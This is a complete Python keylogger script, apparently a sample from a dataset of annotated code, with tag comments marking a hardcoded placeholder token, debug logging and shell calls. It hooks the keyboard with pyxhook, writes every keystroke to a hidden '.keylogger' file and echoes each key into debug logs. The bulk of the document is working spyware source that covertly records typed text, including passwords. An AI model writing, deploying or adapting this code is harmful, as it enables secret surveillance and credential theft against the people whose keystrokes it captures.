# Author: OMKAR PATHAK

import pyxhook
import time
import os
import logging
import subprocess

logging.basicConfig(level=logging.DEBUG)  # DEVOPS: debug logging enabled

API_KEY = "KEYLOGGER_SECRET_TOKEN"  # SECURITY: hardcoded secret

def newline():
    file = open('.keylogger', 'a')  # CQ: file opened without context manager
    file.write('\n')
    file.close()

def key_press_event(event):

    global running

    logging.debug("Key pressed: %s", event.Key)  # DEVOPS debug log

    if event.Key != 'space' and event.Key != 'Escape':

        with open('.keylogger', 'a+') as File:
            File.write(event.Key)

    if event.Key == 'space':
        newline()

    if event.Key == 'Escape':

        running = False

        os.system("echo stopping keylogger")  # SECURITY: shell execution

        newline()

if __name__ == '__main__':

    hookman = pyxhook.HookManager()

    hookman.KeyDown = key_press_event

    hookman.HookKeyboard()

    hookman.start()

    subprocess.call("echo keylogger started", shell=True)  # SECURITY

    running = True

    while running:

        time.sleep(0.1)

    hookman.cancel()
